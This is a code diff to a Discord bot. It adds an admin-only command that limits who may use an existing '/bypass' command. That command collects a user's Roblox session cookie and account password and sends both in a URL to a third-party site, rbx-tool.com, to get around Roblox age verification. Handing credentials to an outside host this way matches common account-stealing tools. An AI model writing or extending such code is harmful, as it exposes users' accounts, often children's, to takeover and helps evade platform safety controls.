@@ -1,6 +1,5 @@
 
 const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, REST, Routes } = require('discord.js');
-const fetch = require('node-fetch');
 
 // Environment variables
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
@@ -10,6 +9,9 @@ if (!DISCORD_TOKEN || !CLIENT_ID) {
     console.error('Missing required environment variables: DISCORD_TOKEN and CLIENT_ID');
     process.exit(1);
 }
+
+// Store bypass role per guild
+const bypassRoles = new Map();
 
 // Create Discord client
 const client = new Client({
@@ -30,7 +32,16 @@ const commands = [
             option.setName('password')
                 .setDescription('Roblox account password')
                 .setRequired(true)
+        ),
+    new SlashCommandBuilder()
+        .setName('setbypassrole')
+        .setDescription('Set which role can use the bypass command (Admin only)')
+        .addRoleOption(option =>
+            option.setName('role')
+                .setDescription('Role that can use the bypass command')
+                .setRequired(true)
         )
+        .setDefaultMemberPermissions(8) // Administrator permission
 ];
 
 // Register slash commands
@@ -57,6 +68,8 @@ client.on('interactionCreate', async interaction => {
     
     if (interaction.commandName === 'bypass') {
         await handleBypassCommand(interaction);
+    } else if (interaction.commandName === 'setbypassrole') {
+        await handleSetBypassRoleCommand(interaction);
     }
 });
 
@@ -65,10 +78,29 @@ async function handleBypassCommand(interaction) {
     // Defer the reply to give us more time to process
     await interaction.deferReply({ ephemeral: true });
     
+    // Check if user has required role
+    const requiredRoleId = bypassRoles.get(interaction.guildId);
+    if (requiredRoleId) {
+        const member = await interaction.guild.members.fetch(interaction.user.id);
+        if (!member.roles.cache.has(requiredRoleId)) {
+            const errorEmbed = new EmbedBuilder()
+                .setTitle('Access Denied')
+                .setDescription('You do not have the required role to use this command.')
+                .setColor(0xFF0000)
+                .setTimestamp();
+            
+            await interaction.editReply({ embeds: [errorEmbed] });
+            return;
+        }
+    }
+    
     const cookie = interaction.options.getString('cookie');
     const password = interaction.options.getString('password');
     
     try {
+        // Dynamic import for node-fetch
+        const fetch = (await import('node-fetch')).default;
+        
         // Make API request
         const apiUrl = `https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`;
         
@@ -170,6 +202,22 @@ async function handleBypassCommand(interaction) {
         
         await interaction.editReply({ embeds: [errorEmbed] });
     }
+}
+
+// Handle the setbypassrole command
+async function handleSetBypassRoleCommand(interaction) {
+    const role = interaction.options.getRole('role');
+    
+    // Store the role for this guild
+    bypassRoles.set(interaction.guildId, role.id);
+    
+    const embed = new EmbedBuilder()
+        .setTitle('Bypass Role Updated')
+        .setDescription(`The bypass command can now only be used by members with the **${role.name}** role.`)
+        .setColor(0x00FF00)
+        .setTimestamp();
+    
+    await interaction.reply({ embeds: [embed], ephemeral: true });
 }
 
 // Bot ready event
